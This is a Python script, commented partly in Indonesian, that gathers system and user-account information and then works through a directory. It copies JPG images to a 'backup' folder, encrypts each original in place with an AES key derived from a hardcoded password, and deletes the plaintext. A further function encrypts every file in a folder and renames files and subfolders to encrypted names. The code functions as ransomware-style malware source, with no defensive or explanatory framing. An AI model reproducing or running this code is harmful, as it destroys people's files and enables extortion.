import platform
import getpass
import subprocess
import os
import shutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import binascii
import hashlib

def get_system_info():
    # Informasi sistem operasi
    system_info = {
        "OS": platform.system(),
        "OS Release": platform.release(),
        "Processor": platform.processor(),
        "Architecture": platform.architecture(),
    }
    return system_info

def get_logged_in_users():
    # Informasi pengguna yang sedang login
    logged_in_users = getpass.getuser()
    return logged_in_users

def get_connected_accounts():
    # Informasi akun yang terhubung
    try:
        accounts = subprocess.check_output(["ls", "/home"]).decode().split()
    except subprocess.CalledProcessError:
        accounts = ["Error: Failed to fetch accounts"]
    return accounts

def backup_jpg_files(source_directory, target_directory, exclude_directory):
    # Cari file JPG di direktori sumber dan backup ke direktori target
    jpg_files = []
    for root, _, files in os.walk(source_directory):
        if exclude_directory in root:
            continue
        for file in files:
            if file.endswith(".jpg"):
                source_path = os.path.join(root, file)
                target_path = os.path.join(target_directory, os.path.relpath(source_path, source_directory))
                os.makedirs(os.path.dirname(target_path), exist_ok=True)
                shutil.copy2(source_path, target_path)
                jpg_files.append(target_path)
                # Enkripsi file asli di tempatnya
                key = generate_aes_key()  # Generate a suitable AES key
                encrypt_file_in_place(source_path, key)  # Encrypt file in place
    return jpg_files

def generate_aes_key():
    # Generate a 32-byte AES key using hashlib (adjust for your specific key generation method)
    password = '123456789qwertyu'
    key = hashlib.sha256(password.encode()).digest()
    return key[:32]  # Return first 32 bytes of the digest

def encrypt_text(plaintext, key):
    # Ensure key length is correct for AES
    key = key[:32]  # Ensure key length is 32 bytes
    cipher = AES.new(key, AES.MODE_CFB)
    iv = cipher.iv
    ciphertext = cipher.encrypt(plaintext.encode())
    return binascii.hexlify(iv + ciphertext).decode()

def encrypt_file(filename, key):
    # Ensure key length is correct for AES
    key = key[:32]  # Ensure key length is 32 bytes
    with open(filename, 'rb') as file:
        plaintext = file.read()

    cipher = AES.new(key, AES.MODE_CFB)
    iv = cipher.iv
    ciphertext = iv + cipher.encrypt(plaintext)

    encrypted_filename = filename + ".enc"
    with open(encrypted_filename, 'wb') as file:
        file.write(ciphertext)

    return encrypted_filename

def encrypt_file_in_place(filename, key):
    # Ensure key length is correct for AES
    key = key[:32]  # Ensure key length is 32 bytes
    encrypted_filename = filename + ".enc"
    encrypt_file(filename, key)
    os.remove(filename)
    return encrypted_filename

def encrypt_folder(folder_path, key):
    # Ensure key length is correct for AES
    key = key[:32]  # Ensure key length is 32 bytes
    for root, dirs, files in os.walk(folder_path, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            encrypt_file(file_path, key)
            encrypted_name = encrypt_text(name, key)
            os.rename(file_path, os.path.join(root, encrypted_name))
        for name in dirs:
            dir_path = os.path.join(root, name)
            encrypted_name = encrypt_text(name, key)
            os.rename(dir_path, os.path.join(root, encrypted_name))

    # Encrypt the top folder
    folder_base = os.path.basename(folder_path)
    encrypted_folder_base = encrypt_text(folder_base, key)
    new_folder_path = os.path.join(os.path.dirname(folder_path), encrypted_folder_base)
    os.rename(folder_path, new_folder_path)
    return new_folder_path
